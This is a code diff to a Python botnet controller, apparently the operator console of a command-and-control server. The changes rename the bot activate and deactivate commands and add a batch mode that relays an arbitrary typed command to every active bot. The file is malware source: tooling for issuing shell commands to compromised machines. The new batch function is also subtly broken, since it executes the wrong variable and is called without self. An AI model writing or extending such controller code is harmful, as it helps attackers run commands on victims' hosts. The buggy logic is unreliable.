@@ -132,11 +132,13 @@ class BotCmd(threading.Thread):
                     print("| %3d | %15s |"% (conn.getID(), conn.getIP()))
                     print("-------------------------")
 
-            elif (cmd == "set-active"):
-
+            elif (cmd == "activate"):
+                
+                #try:
                 selectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
                 print("ID list obtained: " + str(selectedIDs))
-                
+                #except:
+
                 for conn in allConnections:
                     #print("Handler: ", str(conn))
 
@@ -148,22 +150,36 @@ class BotCmd(threading.Thread):
                     #else:
                     #    print("Bot %d not found in active list..."% (conn.getID()))
 
-            elif (cmd == "deselect"):
+            elif (cmd == "deactivate"):
                 deselectedIDs = [int(n) for n in input('Enter IDs (seperated by spaces): ').split()]
                 print("ID list obtained: " + str(deselectedIDs))
 
-                for conn in activeConnections:
+                for conn in allConnections:
                     #print("Handler: ", str(conn))
 
-                    if conn.getID() in selectedIDs:
-                        print("Deactivating Bot " + str(conn.getID()))
-                        conn.deactivate()
-                        activeConnections.remove(conn)
+                    if conn.getID() in deselectedIDs and conn.isActivated():
+                            print("Deactivating Bot " + str(conn.getID()))
+                            conn.deactivate()
+                            activeConnections.remove(conn)
+            elif (cmd == "batch-mode"):
+                batchMode()
+
             else:
                 print("[+] Sending Command: " + cmd + " to " + str(len(allConnections)) + " bots")
                 for conn in activeConnections:                                         # for i in range(len(allConnections)):
                     time.sleep(0.1)
                     conn.execute(cmd)
+
+    def batchMode(self):
+
+        os.system("clear")
+        batch_cmd = str(input("[Batch-CMD]# "))
+        print("[+] Sending Command: " + batch_cmd + " to " + str(len(allConnections)) + " bots")
+        for conn in activeConnections:                                         # for i in range(len(allConnections)):
+            time.sleep(0.1)
+            conn.execute(cmd)
+
+
 
 # --------------------------------------------------------------------------------------------------------------------------
 
